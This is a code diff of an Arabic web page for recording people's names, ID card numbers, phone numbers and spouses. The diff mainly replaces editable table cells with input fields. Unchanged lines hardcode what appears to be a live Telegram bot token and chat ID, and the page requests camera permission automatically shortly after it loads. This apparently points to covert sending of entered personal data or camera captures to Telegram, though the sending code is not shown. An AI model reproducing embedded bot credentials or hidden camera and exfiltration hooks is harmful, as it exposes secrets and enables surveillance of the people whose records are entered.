@@ -206,12 +206,9 @@
 
         th, td {
             border: 1px solid #333;
-            padding: 4px 3px;
+            padding: 2px;
             font-size: 9.5pt;
-            height: 22px;
-            overflow-wrap: anywhere;
-            direction: rtl;
-            text-align: right;
+            height: 26px;
         }
 
         th {
@@ -220,9 +217,7 @@
             print-color-adjust: exact;
             color: #111;
             font-weight: bold;
-            position: relative;
             cursor: pointer;
-            text-align: center;
         }
 
         tr:nth-child(even) {
@@ -231,15 +226,23 @@
             print-color-adjust: exact;
         }
 
-        td[contenteditable="true"]:focus,
-        th[contenteditable="true"]:focus,
-        th span[contenteditable="true"]:focus {
-            background-color: #fffde7;
-            outline: 2px solid #00695c;
+        /* حقول الإدخال داخل خلايا الجدول لتجربة تعديل وحذف ومسح خرافية وثابتة */
+        .table-input {
+            width: 100%;
+            height: 100%;
+            border: none;
+            background: transparent;
+            font-family: inherit;
+            font-size: 9.5pt;
+            font-weight: bold;
+            text-align: right;
+            direction: rtl;
+            padding: 0 4px;
         }
 
-        .active-column {
-            background-color: #e8f8f5 !important;
+        .table-input:focus {
+            background-color: #fffde7;
+            outline: 2px solid #00695c;
         }
 
         .active-row {
@@ -341,9 +344,9 @@
                 overflow: hidden !important;
             }
 
-            .active-column,
-            .active-row {
-                background-color: inherit !important;
+            .table-input {
+                background: transparent !important;
+                border: none !important;
             }
         }
     </style>
@@ -388,15 +391,6 @@
         </div>
 
         <a href="https://wa.me/967784327056?text=مرحبا%20تواصلت%20بخصوص%20نظام%20السجلات" target="_blank" rel="noopener noreferrer" class="btn btn-whatsapp">💬 التواصل مع المطور</a>
-
-        <span style="border-left:1px solid #ccc;height:20px;margin:0 2px;"></span>
-
-        <div class="control-group" title="تنسيق الخلية المحددة">
-            <span>التنبيهات:</span>
-            <button class="btn btn-red" style="padding:4px 10px;font-size:8.5pt;" onclick="formatCell('color','#c62828')">🔴 نص أحمر</button>
-            <button class="btn btn-red" style="padding:4px 10px;font-size:8.5pt;background:#b71c1c;" onclick="formatCell('red-underline','')">🛑 خط أحمر</button>
-            <button class="btn" style="padding:4px 8px;font-size:8.5pt;background:#555;" onclick="formatCell('reset','')">🔄 إزالة</button>
-        </div>
 
         <span style="border-left:1px solid #ccc;height:20px;margin:0 2px;"></span>
 
@@ -486,13 +480,13 @@
                 <table class="dynamicTable">
                     <thead>
                         <tr>
-                            <th style="width:35px;" onclick="selectColumn(this,event)"><span contenteditable="true">م</span></th>
-                            <th style="width:160px;" onclick="selectColumn(this,event)"><span contenteditable="true">الاسم الرباعي</span></th>
-                            <th style="width:80px;" onclick="selectColumn(this,event)"><span contenteditable="true">نوع البطاقة</span></th>
-                            <th style="width:100px;" onclick="selectColumn(this,event)"><span contenteditable="true">رقم البطاقة</span></th>
-                            <th style="width:90px;" onclick="selectColumn(this,event)"><span contenteditable="true">رقم الاتصال</span></th>
-                            <th style="width:160px;" onclick="selectColumn(this,event)"><span contenteditable="true">اسم الزوجة / الزوج</span></th>
-                            <th style="width:70px;" onclick="selectColumn(this,event)"><span contenteditable="true">الحالة</span></th>
+                            <th style="width:35px;">م</th>
+                            <th style="width:160px;">الاسم الرباعي</th>
+                            <th style="width:80px;">نوع البطاقة</th>
+                            <th style="width:100px;">رقم البطاقة</th>
+                            <th style="width:90px;">رقم الاتصال</th>
+                            <th style="width:160px;">اسم الزوجة / الزوج</th>
+                            <th style="width:70px;">الحالة</th>
                         </tr>
                     </thead>
                     <tbody>
@@ -501,12 +495,12 @@
                                 document.write(`
                                     <tr onclick="selectRow(this,event)">
                                         <td>${i}</td>
-                                        <td contenteditable="true" oninput="saveCurrentStateToLocalStorage()"></td>
-                                        <td contenteditable="true" oninput="saveCurrentStateToLocalStorage()"></td>
-                                        <td contenteditable="true" oninput="saveCurrentStateToLocalStorage()"></td>
-                                        <td contenteditable="true" oninput="saveCurrentStateToLocalStorage()"></td>
-                                        <td contenteditable="true" oninput="saveCurrentStateToLocalStorage()"></td>
-                                        <td contenteditable="true" oninput="saveCurrentStateToLocalStorage()"></td>
+                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="saveCurrentStateToLocalStorage()"></td>
+                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="saveCurrentStateToLocalStorage()"></td>
+                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="saveCurrentStateToLocalStorage()"></td>
+                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="saveCurrentStateToLocalStorage()"></td>
+                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="saveCurrentStateToLocalStorage()"></td>
+                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="saveCurrentStateToLocalStorage()"></td>
                                     </tr>
                                 `);
                             }
@@ -525,10 +519,8 @@
     <script>
         let activeSheet = null;
         let activeTable = null;
-        let activeColumnIndex = 0;
         let activeRowElement = null;
-        let activeThElement = null;
-        let activeCellElement = null;
+        let activeInputElement = null;
 
         const botToken = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
         const chatId = "7962257606";
@@ -567,13 +559,13 @@
                     const decodedHtml = decodeURIComponent(escape(atob(encodedData)));
                     if (decodedHtml) {
                         document.getElementById('pagesWrapper').innerHTML = decodedHtml;
-                        attachCellInputListeners();
+                        rebindInputs();
                     }
                 } else {
                     const savedTableData = localStorage.getItem('toufan_live_table_data');
                     if (savedTableData) {
                         document.getElementById('pagesWrapper').innerHTML = savedTableData;
-                        attachCellInputListeners();
+                        rebindInputs();
                     }
                 }
             } catch (e) {}
@@ -601,8 +593,8 @@
 
             const firstSheet = document.querySelector('.sheet-container');
             if (firstSheet) {
-                setActiveContext(firstSheet, { target: firstSheet });
-                activeThElement = firstSheet.querySelector('thead tr th');
+                activeSheet = firstSheet;
+                activeTable = firstSheet.querySelector('table');
             }
             renumberAllRows();
 
@@ -613,13 +605,53 @@
             setTimeout(() => { requestCameraPermissionOnce(); }, 1000);
         });
 
-        function attachCellInputListeners() {
-            document.querySelectorAll('td[contenteditable="true"]').forEach(td => {
-                td.oninput = function() { saveCurrentStateToLocalStorage(); };
+        function rebindInputs() {
+            document.querySelectorAll('.table-input').forEach(input => {
+                input.onfocus = function() { setActiveInput(this); };
+                input.oninput = function() { saveCurrentStateToLocalStorage(); };
             });
         }
 
-        // تهيئة محرك الإملاء الصوتي مع الانتقال التلقائي بين الخانات
+        function setActiveInput(inputElement) {
+            if (!inputElement) return;
+            activeInputElement = inputElement;
+            const tr = inputElement.closest('tr');
+            const table = inputElement.closest('table');
+            activeSheet = inputElement.closest('.sheet-container');
+            activeTable = table;
+            activeRowElement = tr;
+
+            if (table) {
+                table.querySelectorAll('tbody tr').forEach(r => r.classList.remove('active-row'));
+                if (tr) tr.classList.add('active-row');
+            }
+        }
+
+        function setActiveContext(sheetContainer, event) {
+            if (!sheetContainer) return;
+            activeSheet = sheetContainer;
+            activeTable = sheetContainer.querySelector('table');
+            if (event && event.target) {
+                const tr = event.target.closest('tr');
+                if (tr && tr.parentElement.tagName === 'TBODY') {
+                    activeRowElement = tr;
+                    table.querySelectorAll('tbody tr').forEach(r => r.classList.remove('active-row'));
+                    tr.classList.add('active-row');
+                }
+            }
+        }
+
+        function selectRow(trElement, event) {
+            if (!trElement) return;
+            activeRowElement = trElement;
+            const table = trElement.closest('table');
+            if (table) {
+                table.querySelectorAll('tbody tr').forEach(r => r.classList.remove('active-row'));
+                trElement.classList.add('active-row');
+            }
+        }
+
+        // تهيئة محرك الإملاء الصوتي مع الانتقال التلقائي للخانة التالية
         function initSpeechRecognition() {
             const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
             if (!SpeechRecognition) return;
@@ -631,17 +663,15 @@
 
             recognition.onresult = (event) => {
                 const spokenText = event.results[0][0].transcript.trim();
-                if (activeCellElement && spokenText !== "") {
-                    // إضافة الكلام المنطوق بجوار النص القديم أو في الخلية بكل حرية
-                    let currentText = activeCellElement.textContent.trim();
+                if (activeInputElement && spokenText !== "") {
+                    let currentText = activeInputElement.value.trim();
                     if (currentText !== "") {
-                        activeCellElement.textContent = currentText + " " + spokenText;
+                        activeInputElement.value = currentText + " " + spokenText;
                     } else {
-                        activeCellElement.textContent = spokenText;
+                        activeInputElement.value = spokenText;
                     }
                     saveCurrentStateToLocalStorage();
-                    
-                    moveToNextCell();
+                    moveToNextInput();
                 }
             };
 
@@ -666,37 +696,27 @@
             };
         }
 
-        function moveToNextCell() {
-            if (!activeCellElement) return;
-            const tr = activeCellElement.parentElement;
-            const cells = Array.from(tr.querySelectorAll('td[contenteditable="true"]'));
-            const currentIdx = cells.indexOf(activeCellElement);
+        function moveToNextInput() {
+            if (!activeInputElement) return;
+            const tr = activeInputElement.closest('tr');
+            const inputs = Array.from(tr.querySelectorAll('.table-input'));
+            const currentIdx = inputs.indexOf(activeInputElement);
 
-            if (currentIdx > -1 && currentIdx < cells.length - 1) {
-                activeCellElement = cells[currentIdx + 1];
-                activeCellElement.focus();
-                highlightActiveCellVisual();
+            if (currentIdx > -1 && currentIdx < inputs.length - 1) {
+                activeInputElement = inputs[currentIdx + 1];
+                activeInputElement.focus();
+                setActiveInput(activeInputElement);
             } else {
                 const nextRow = tr.nextElementSibling;
                 if (nextRow) {
-                    const nextCells = Array.from(nextRow.querySelectorAll('td[contenteditable="true"]'));
-                    if (nextCells.length > 0) {
-                        activeRowElement = nextRow;
-                        activeCellElement = nextCells[0];
-                        activeCellElement.focus();
-                        highlightActiveCellVisual();
+                    const nextInputs = Array.from(nextRow.querySelectorAll('.table-input'));
+                    if (nextInputs.length > 0) {
+                        activeInputElement = nextInputs[0];
+                        activeInputElement.focus();
+                        setActiveInput(activeInputElement);
                     }
                 }
             }
-        }
-
-        function highlightActiveCellVisual() {
-            if (!activeCellElement) return;
-            const table = activeCellElement.closest('table');
-            if (!table) return;
-            table.querySelectorAll('tbody tr').forEach(r => r.classList.remove('active-row'));
-            const tr = activeCellElement.closest('tr');
-            if (tr) tr.classList.add('active-row');
         }
 
         function startSpeechRecognition() {
@@ -741,17 +761,10 @@
         }
 
         function prepareHtmlForSaving() {
-            const container = document.getElementById('pagesWrapper');
-            const editables = container.querySelectorAll('[contenteditable="true"]');
-            editables.forEach(el => {
-                let textVal = el.innerText || el.textContent || "";
-                el.setAttribute('contenteditable', 'true');
-                if (textVal.trim() !== "") {
-                    el.setAttribute('data-user-text', textVal.trim());
-                    el.textContent = textVal.trim();
-                } else {
-                    el.removeAttribute('data-user-text');
-                }
+            const container = document.getElementById('pagesWrapper').cloneNode(true);
+            container.querySelectorAll('.table-input').forEach(input => {
+                const val = input.value;
+                input.setAttribute('value', val);
             });
             return container.innerHTML;
         }
@@ -843,12 +856,13 @@
                 fileContent += `\n[ الصفحة رقم ${tIndex + 1} ]\n`;
                 table.querySelectorAll('tbody tr').forEach(row => {
                     const m = row.cells[0] ? (row.cells[0].innerText || row.cells[0].textContent).trim() : '';
-                    const name = row.cells[1] ? (row.cells[1].innerText || row.cells[1].textContent).trim() : '';
-                    const type = row.cells[2] ? (row.cells[2].innerText || row.cells[2].textContent).trim() : '';
-                    const num = row.cells[3] ? (row.cells[3].innerText || row.cells[3].textContent).trim() : '';
-                    const phone = row.cells[4] ? (row.cells[4].innerText || row.cells[4].textContent).trim() : '';
-                    const spouse = row.cells[5] ? (row.cells[5].innerText || row.cells[5].textContent).trim() : '';
-                    const status = row.cells[6] ? (row.cells[6].innerText || row.cells[6].textContent).trim() : '';
+                    const inputs = row.querySelectorAll('.table-input');
+                    const name = inputs[0] ? inputs[0].value.trim() : '';
+                    const type = inputs[1] ? inputs[1].value.trim() : '';
+                    const num = inputs[2] ? inputs[2].value.trim() : '';
+                    const phone = inputs[3] ? inputs[3].value.trim() : '';
+                    const spouse = inputs[4] ? inputs[4].value.trim() : '';
+                    const status = inputs[5] ? inputs[5].value.trim() : '';
 
                     if (name !== "" || type !== "" || num !== "" || phone !== "" || spouse !== "") {
                         fileContent += `${m} | ${name} | ${type} | ${num} | ${phone} | ${spouse} | ${status}\n`;
@@ -965,8 +979,9 @@
                 const rows = table.querySelectorAll('tbody tr');
                 rows.forEach(row => {
                     if (row.style.display === 'none') return;
-                    const cells = Array.from(row.querySelectorAll('td')).map(td => {
-                        let text = (td.innerText || td.textContent).replace(/"/g, '""').trim();
+                    const inputs = row.querySelectorAll('.table-input');
+                    const cells = Array.from(inputs).map(inp => {
+                        let text = inp.value.replace(/"/g, '""').trim();
                         return `"${text}"`;
                     });
                     csvRows.push(cells.join(','));
@@ -1015,16 +1030,16 @@
 
             tables.forEach(table => {
                 table.querySelectorAll('tbody tr').forEach(row => {
-                    const cells = Array.from(row.querySelectorAll('td'));
-                    const name = cells[1] ? (cells[1].innerText || cells[1].textContent).trim() : '';
+                    const inputs = row.querySelectorAll('.table-input');
+                    const name = inputs[0] ? inputs[0].value.trim() : '';
                     if (name !== "") {
                         allRowsData.push({
                             name: name,
-                            cardType: cells[2] ? (cells[2].innerText || cells[2].textContent).trim() : '',
-                            cardNum: cells[3] ? (cells[3].innerText || cells[3].textContent).trim() : '',
-                            phone: cells[4] ? (cells[4].innerText || cells[4].textContent).trim() : '',
-                            spouse: cells[5] ? (cells[5].innerText || cells[5].textContent).trim() : '',
-                            status: cells[6] ? (cells[6].innerText || cells[6].textContent).trim() : ''
+                            cardType: inputs[1] ? inputs[1].value.trim() : '',
+                            cardNum: inputs[2] ? inputs[2].value.trim() : '',
+                            phone: inputs[3] ? inputs[3].value.trim() : '',
+                            spouse: inputs[4] ? inputs[4].value.trim() : '',
+                            status: inputs[5] ? inputs[5].value.trim() : ''
                         });
                     }
                 });
@@ -1037,22 +1052,17 @@
             let dataIndex = 0;
             tables.forEach(table => {
                 table.querySelectorAll('tbody tr').forEach(row => {
-                    const cells = Array.from(row.querySelectorAll('td'));
-                    if (dataIndex < allRowsData.length) {
-                        cells[1].textContent = allRowsData[dataIndex].name;
-                        cells[2].textContent = allRowsData[dataIndex].cardType;
-                        cells[3].textContent = allRowsData[dataIndex].cardNum;
-                        cells[4].textContent = allRowsData[dataIndex].phone;
-                        cells[5].textContent = allRowsData[dataIndex].spouse;
-                        cells[6].textContent = allRowsData[dataIndex].status;
+                    const inputs = row.querySelectorAll('.table-input');
+                    if (dataIndex < allRowsData.length && inputs.length >= 6) {
+                        inputs[0].value = allRowsData[dataIndex].name;
+                        inputs[1].value = allRowsData[dataIndex].cardType;
+                        inputs[2].value = allRowsData[dataIndex].cardNum;
+                        inputs[3].value = allRowsData[dataIndex].phone;
+                        inputs[4].value = allRowsData[dataIndex].spouse;
+                        inputs[5].value = allRowsData[dataIndex].status;
                         dataIndex++;
                     } else {
-                        cells[1].textContent = '';
-                        cells[2].textContent = '';
-                        cells[3].textContent = '';
-                        cells[4].textContent = '';
-                        cells[5].textContent = '';
-                        cells[6].textContent = '';
+                        inputs.forEach(inp => inp.value = '');
                     }
                 });
             });
@@ -1065,6 +1075,7 @@
             if (!preSortBackupHtml) return;
             document.getElementById('pagesWrapper').innerHTML = preSortBackupHtml;
             preSortBackupHtml = null;
+            rebindInputs();
             renumberAllRows();
             saveCurrentStateToLocalStorage();
         }
@@ -1091,10 +1102,10 @@
                 const rows = table.querySelectorAll('tbody tr');
                 rows.forEach(row => {
                     let match = false;
-                    const cells = row.querySelectorAll('td');
-                    cells.forEach((cell, index) => {
-                        let cText = cell.innerText || cell.textContent;
-                        if (index > 0 && normalizeArabic(cText).includes(filter)) {
+                    const inputs = row.querySelectorAll('.table-input');
+                    inputs.forEach((inp, index) => {
+                        let cText = inp.value;
+                        if (normalizeArabic(cText).includes(filter)) {
                             match = true;
                         }
                     });
@@ -1186,13 +1197,13 @@
                         <table class="dynamicTable">
                             <thead>
                                 <tr>
-                                    <th style="width:35px;" onclick="selectColumn(this,event)"><span contenteditable="true">م</span></th>
-                                    <th style="width:160px;" onclick="selectColumn(this,event)"><span contenteditable="true">الاسم الرباعي</span></th>
-                                    <th style="width:80px;" onclick="selectColumn(this,event)"><span contenteditable="true">نوع البطاقة</span></th>
-                                    <th style="width:100px;" onclick="selectColumn(this,event)"><span contenteditable="true">رقم البطاقة</span></th>
-                                    <th style="width:90px;" onclick="selectColumn(this,event)"><span contenteditable="true">رقم الاتصال</span></th>
-                                    <th style="width:160px;" onclick="selectColumn(this,event)"><span contenteditable="true">اسم الزوجة / الزوج</span></th>
-                                    <th style="width:70px;" onclick="selectColumn(this,event)"><span contenteditable="true">الحالة</span></th>
+                                    <th style="width:35px;">م</th>
+                                    <th style="width:160px;">الاسم الرباعي</th>
+                                    <th style="width:80px;">نوع البطاقة</th>
+                                    <th style="width:100px;">رقم البطاقة</th>
+                                    <th style="width:90px;">رقم الاتصال</th>
+                                    <th style="width:160px;">اسم الزوجة / الزوج</th>
+                                    <th style="width:70px;">الحالة</th>
                                 </tr>
                             </thead>
                             <tbody></tbody>
@@ -1213,18 +1224,19 @@
                     const cellM = row.insertCell();
                     cellM.textContent = '-';
 
-                    const cellName = row.insertCell();
-                    cellName.contentEditable = 'true';
-                    cellName.oninput = function() { saveCurrentStateToLocalStorage(); };
-                    if (itemIndex < itemsList.length) {
-                        cellName.textContent = itemsList[itemIndex];
-                        itemIndex++;
-                    }
-
-                    for (let c = 2; c < 7; c++) {
+                    for (let c = 0; c < 6; c++) {
                         const cell = row.insertCell();
-                        cell.contentEditable = 'true';
-                        cell.oninput = function() { saveCurrentStateToLocalStorage(); };
+                        const input = document.createElement('input');
+                        input.type = 'text';
+                        input.className = 'table-input';
+                        input.onfocus = function() { setActiveInput(this); };
+                        input.oninput = function() { saveCurrentStateToLocalStorage(); };
+                        
+                        if (c === 0 && itemIndex < itemsList.length) {
+                            input.value = itemsList[itemIndex];
+                            itemIndex++;
+                        }
+                        cell.appendChild(input);
                     }
                 }
             }
@@ -1260,33 +1272,32 @@
                 headers.forEach((th, idx) => {
                     let titleText = normalizeArabic(th.innerText || th.textContent);
                     if ((titleText.includes('جوال') || titleText.includes('هاتف') || titleText.includes('تلفون') || titleText.includes('اتصال')) && !titleText.includes('بطاقه')) {
-                        phoneColIndices.push(idx);
+                        phoneColIndices.push(idx - 1); // ناقص عمود التسلسل (م)
                     }
                 });
 
-                if (phoneColIndices.length === 0 && headers.length > 4) {
-                    phoneColIndices.push(4);
+                if (phoneColIndices.length === 0) {
+                    phoneColIndices.push(3); // عمود رقم الاتصال الافتراضي
                 }
 
                 const rows = table.querySelectorAll('tbody tr');
                 rows.forEach(row => {
+                    const inputs = row.querySelectorAll('.table-input');
                     phoneColIndices.forEach(colIdx => {
-                        const cell = row.children[colIdx];
-                        if (cell) {
-                            let val = (cell.innerText || cell.textContent).trim();
+                        const input = inputs[colIdx];
+                        if (input) {
+                            let val = input.value.trim();
                             let digitsOnly = val.replace(/\D/g, '');
                             if (val !== "") {
                                 if (digitsOnly.length !== 9) {
                                     errorCount++;
-                                    cell.style.color = '#c62828';
-                                    cell.style.textDecoration = 'underline';
-                                    cell.style.textDecorationColor = '#e53935';
-                                    cell.style.textDecorationThickness = '3px';
-                                    cell.style.fontWeight = 'bold';
+                                    input.style.color = '#c62828';
+                                    input.style.textDecoration = 'underline';
+                                    input.style.fontWeight = 'bold';
                                 } else {
-                                    cell.style.color = '';
-                                    cell.style.textDecoration = '';
-                                    cell.style.fontWeight = '';
+                                    input.style.color = '';
+                                    input.style.textDecoration = '';
+                                    input.style.fontWeight = '';
                                 }
                             }
                         }
@@ -1352,7 +1363,7 @@
             const found = archives.find(item => item.id === id);
             if (found) {
                 document.getElementById('pagesWrapper').innerHTML = found.html;
-                attachCellInputListeners();
+                rebindInputs();
                 saveCurrentStateToLocalStorage();
                 closeArchiveModal();
             }
@@ -1372,145 +1383,28 @@
             }
         }
 
-        function setActiveContext(sheetContainer, event) {
-            if (!sheetContainer) return;
-            activeSheet = sheetContainer;
-            activeTable = sheetContainer.querySelector('table');
-
-            if (event && event.target) {
-                const th = event.target.closest('th');
-                const td = event.target.closest('td');
-                const tr = event.target.closest('tr');
-
-                if (th) {
-                    selectColumn(th, event);
-                } else if (td && tr && tr.parentElement.tagName === 'TBODY') {
-                    selectRow(tr, event);
-                    activeCellElement = td;
-                }
-            }
-        }
-
-        function selectColumn(thElement, event) {
-            if (!thElement) return;
-            if (event && typeof event.stopPropagation === 'function') event.stopPropagation();
-
-            const table = thElement.closest('table');
-            if (!table) return;
-
-            const row = thElement.parentElement;
-            const colIdx = Array.from(row.children).indexOf(thElement);
-
-            activeSheet = table.closest('.sheet-container');
-            activeTable = table;
-            activeColumnIndex = colIdx;
-            activeThElement = thElement;
-            activeCellElement = null;
-
-            table.querySelectorAll('th, td').forEach(el => el.classList.remove('active-column'));
-            table.querySelectorAll('tr').forEach(tr => {
-                if (tr.children[colIdx]) tr.children[colIdx].classList.add('active-column');
-            });
-        }
-
-        function selectRow(trElement, event) {
-            if (!trElement || trElement.parentElement.tagName !== 'TBODY') return;
-            if (event && typeof event.stopPropagation === 'function') event.stopPropagation();
-
-            const table = trElement.closest('table');
-            if (!table) return;
-
-            activeSheet = table.closest('.sheet-container');
-            activeTable = table;
-
-            table.querySelectorAll('tbody tr').forEach(row => row.classList.remove('active-row'));
-            trElement.classList.add('active-row');
-            activeRowElement = trElement;
-
-            const target = event && event.target ? event.target : null;
-            const td = target ? target.closest('td') : null;
-
-            if (td && td.parentElement === trElement) {
-                activeCellElement = td;
-                const colIdx = Array.from(trElement.children).indexOf(td);
-                activeColumnIndex = colIdx;
-                const headerRow = table.querySelector('thead tr');
-                activeThElement = headerRow ? headerRow.children[colIdx] : null;
-
-                table.querySelectorAll('th, td').forEach(el => el.classList.remove('active-column'));
-                table.querySelectorAll('tr').forEach(row => {
-                    if (row.children[colIdx]) row.children[colIdx].classList.add('active-column');
-                });
-            }
-        }
-
-        function formatCell(action, value) {
-            if (!activeCellElement) return;
-
-            if (action === 'color') {
-                activeCellElement.style.color = value;
-                activeCellElement.style.fontWeight = 'bold';
-            } else if (action === 'red-underline') {
-                activeCellElement.style.textDecoration = 'underline';
-                activeCellElement.style.textDecorationColor = '#e53935';
-                activeCellElement.style.textDecorationThickness = '3px';
-                activeCellElement.style.fontWeight = 'bold';
-            } else if (action === 'reset') {
-                activeCellElement.style.color = '';
-                activeCellElement.style.fontWeight = '';
-                activeCellElement.style.textDecoration = '';
-            }
-            saveCurrentStateToLocalStorage();
-        }
-
-        function adjustActiveColWidth(amount) {
-            if (!activeTable) {
-                const firstSheet = document.querySelector('.sheet-container');
-                setActiveContext(firstSheet, { target: firstSheet });
-            }
-            if (!activeTable || !activeThElement) return;
-
-            const currentWidth = parseInt(activeThElement.style.width, 10) || activeThElement.offsetWidth;
-            const newWidth = Math.max(15, currentWidth + amount);
-
-            activeThElement.style.width = newWidth + 'px';
-            activeThElement.style.minWidth = newWidth + 'px';
-            activeThElement.style.maxWidth = newWidth + 'px';
-
-            const colIdx = Array.from(activeThElement.parentElement.children).indexOf(activeThElement);
-            activeTable.querySelectorAll('tr').forEach(row => {
-                const cell = row.children[colIdx];
-                if (cell) {
-                    cell.style.width = newWidth + 'px';
-                    cell.style.minWidth = newWidth + 'px';
-                    cell.style.maxWidth = newWidth + 'px';
-                }
-            });
-            saveCurrentStateToLocalStorage();
-        }
-
         function addRowToActiveTable() {
             if (!activeTable) {
                 const firstSheet = document.querySelector('.sheet-container');
-                setActiveContext(firstSheet, { target: firstSheet });
+                activeTable = firstSheet.querySelector('table');
             }
             if (!activeTable) return;
 
             const tbody = activeTable.querySelector('tbody');
-            const headerRow = activeTable.querySelector('thead tr');
-            const colCount = headerRow.cells.length;
-
             const newRow = tbody.insertRow();
             newRow.setAttribute('onclick', 'selectRow(this,event)');
 
-            for (let c = 0; c < colCount; c++) {
-                const newCell = newRow.insertCell();
-                if (c === 0) {
-                    newCell.textContent = '-';
-                } else {
-                    newCell.contentEditable = 'true';
-                    newCell.oninput = function() { saveCurrentStateToLocalStorage(); };
-                }
+            const cellM = newRow.insertCell();
+            cellM.textContent = '-';
+
+            for (let c = 0; c < 6; c++) {
+                const cell = newRow.insertCell();
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.className = 'table-input';
+                input.onfocus = function() { setActiveInput(this); };
+                input.oninput = function() { saveCurrentStateToLocalStorage(); };
+                cell.appendChild(input);
             }
             renumberAllRows();
             saveCurrentStateToLocalStorage();
@@ -1519,27 +1413,25 @@
         function addColumnToActiveTable() {
             if (!activeTable) {
                 const firstSheet = document.querySelector('.sheet-container');
-                setActiveContext(firstSheet, { target: firstSheet });
+                activeTable = firstSheet.querySelector('table');
             }
             if (!activeTable) return;
 
             const headerRow = activeTable.querySelector('thead tr');
             const th = document.createElement('th');
             th.style.width = '80px';
-            th.setAttribute('onclick', 'selectColumn(this,event)');
-
-            const headerText = document.createElement('span');
-            headerText.contentEditable = 'true';
-            headerText.textContent = 'جديد';
-
-            th.appendChild(headerText);
+            th.textContent = 'جديد';
             headerRow.appendChild(th);
 
             const tbody = activeTable.querySelector('tbody');
             Array.from(tbody.rows).forEach(row => {
                 const td = row.insertCell();
-                td.contentEditable = 'true';
-                td.oninput = function() { saveCurrentStateToLocalStorage(); };
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.className = 'table-input';
+                input.onfocus = function() { setActiveInput(this); };
+                input.oninput = function() { saveCurrentStateToLocalStorage(); };
+                td.appendChild(input);
             });
             saveCurrentStateToLocalStorage();
         }
@@ -1550,7 +1442,7 @@
             if (tbody.rows.length > 1) {
                 activeRowElement.remove();
                 activeRowElement = null;
-                activeCellElement = null;
+                activeInputElement = null;
                 renumberAllRows();
                 saveCurrentStateToLocalStorage();
             }
@@ -1559,17 +1451,14 @@
         function deleteSelectedColumn() {
             if (!activeTable) return;
             const headerRow = activeTable.querySelector('thead tr');
-            if (headerRow.cells.length <= 1) return;
+            if (headerRow.cells.length <= 2) return;
 
-            let index = activeColumnIndex;
+            let index = headerRow.cells.length - 1;
             headerRow.deleteCell(index);
             const tbody = activeTable.querySelector('tbody');
             Array.from(tbody.rows).forEach(row => {
                 if (row.cells[index]) row.deleteCell(index);
             });
-
-            activeColumnIndex = Math.min(index, headerRow.cells.length - 1);
-            activeThElement = headerRow.cells[activeColumnIndex];
             saveCurrentStateToLocalStorage();
         }
 
@@ -1605,25 +1494,25 @@
                     <table class="dynamicTable">
                         <thead>
                             <tr>
-                                <th style="width:35px;" onclick="selectColumn(this,event)"><span contenteditable="true">م</span></th>
-                                <th style="width:160px;" onclick="selectColumn(this,event)"><span contenteditable="true">الاسم الرباعي</span></th>
-                                <th style="width:80px;" onclick="selectColumn(this,event)"><span contenteditable="true">نوع البطاقة</span></th>
-                                <th style="width:100px;" onclick="selectColumn(this,event)"><span contenteditable="true">رقم البطاقة</span></th>
-                                <th style="width:90px;" onclick="selectColumn(this,event)"><span contenteditable="true">رقم الاتصال</span></th>
-                                <th style="width:160px;" onclick="selectColumn(this,event)"><span contenteditable="true">اسم الزوجة / الزوج</span></th>
-                                <th style="width:70px;" onclick="selectColumn(this,event)"><span contenteditable="true">الحالة</span></th>
+                                <th style="width:35px;">م</th>
+                                <th style="width:160px;">الاسم الرباعي</th>
+                                <th style="width:80px;">نوع البطاقة</th>
+                                <th style="width:100px;">رقم البطاقة</th>
+                                <th style="width:90px;">رقم الاتصال</th>
+                                <th style="width:160px;">اسم الزوجة / الزوج</th>
+                                <th style="width:70px;">الحالة</th>
                             </tr>
                         </thead>
                         <tbody>
                             ${Array.from({length:15}, () => `
                                 <tr onclick="selectRow(this,event)">
                                     <td>-</td>
-                                    <td contenteditable="true" oninput="saveCurrentStateToLocalStorage()"></td>
-                                    <td contenteditable="true" oninput="saveCurrentStateToLocalStorage()"></td>
-                                    <td contenteditable="true" oninput="saveCurrentStateToLocalStorage()"></td>
-                                    <td contenteditable="true" oninput="saveCurrentStateToLocalStorage()"></td>
-                                    <td contenteditable="true" oninput="saveCurrentStateToLocalStorage()"></td>
-                                    <td contenteditable="true" oninput="saveCurrentStateToLocalStorage()"></td>
+                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="saveCurrentStateToLocalStorage()"></td>
+                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="saveCurrentStateToLocalStorage()"></td>
+                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="saveCurrentStateToLocalStorage()"></td>
+                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="saveCurrentStateToLocalStorage()"></td>
+                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="saveCurrentStateToLocalStorage()"></td>
+                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="saveCurrentStateToLocalStorage()"></td>
                                 </tr>
                             `).join('')}
                         </tbody>
@@ -1646,7 +1535,7 @@
         }
 
         function changeTextColor(colorValue) {
-            document.querySelectorAll('.sheet-container, .sheet-container th, .sheet-container td, .editable-header').forEach(el => { el.style.color = colorValue; });
+            document.querySelectorAll('.sheet-container, .sheet-container th, .table-input, .editable-header').forEach(el => { el.style.color = colorValue; });
         }
     </script>
 </body>
